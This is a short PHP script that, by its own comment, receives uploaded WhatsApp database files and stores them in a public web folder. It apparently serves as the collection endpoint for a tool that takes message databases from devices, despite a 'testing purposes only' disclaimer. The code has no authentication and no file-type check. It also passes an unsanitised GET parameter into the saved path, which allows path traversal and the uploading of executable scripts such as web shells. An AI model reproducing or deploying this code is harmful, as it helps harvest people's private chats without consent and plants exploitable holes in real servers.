
<?php
// Upload script to upload Whatsapp database
// This script is for testing purposes only.


//replace your website path 
$uploaddir = '/home/yourwebsite.com/public_html/p/';

//echo $uploaddir; die();
if ($_FILES["file"]["error"] > 0)
  {
  echo "Error: " . $_FILES["file"]["error"] . "<br>";
  }
else
  {
  $uploadfile = $uploaddir . $_GET['n'] . "." . basename($_FILES['file']['name']);
  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
  }
?>